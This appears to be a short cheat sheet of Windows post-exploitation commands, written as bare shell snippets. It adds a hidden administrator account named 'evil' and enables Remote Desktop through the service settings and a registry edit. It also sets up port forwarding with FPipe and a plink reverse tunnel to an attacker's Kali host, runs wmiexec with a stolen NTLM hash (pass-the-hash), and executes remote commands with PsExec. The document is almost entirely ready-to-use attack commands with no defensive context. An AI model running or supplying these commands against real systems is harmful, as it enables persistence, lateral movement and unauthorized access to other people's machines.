# Basic commands
- Setup evil user
  - cmd
    ~~~sh
    set USER=evil
    set PASS=p@ssw0rd
    # add user
    net user /add %USER% %PASS%
    net localgroup administrators /add %USER%
    # Add and start rdp
    ## check
    tasklist /svc | findstr /C:TermService
    net localgroup "Remote Desktop users" %USER% /add
    net start TermService
    ## Permanently enable Terminal Services
    sc config TermService start=auto
    ## Enable Terminal services through registry // reboot after
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    ~~~
  - powershell
  - vbs

- Port forwarding
  - fpipe
    ~~~
    FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
    FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
    ~~~
  - plink
    ~~~sh
    # on windows for kali
    plink.exe -l root -pw Parolaroot -R 445:127.0.0.1:445
    plink -P 22 -l root -pw Parolaroot -C -R 445:127.0.0.1:445 192.168.12.185
    ~~~

- Pass the hash
  ~~~sh
  wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE alice@localhost
  ~~~

- Exec command on remote windows machine
  ~~~sh
  PsExec.exe \\${HOST} -u alice -p somepasswd cmd
  ~~~
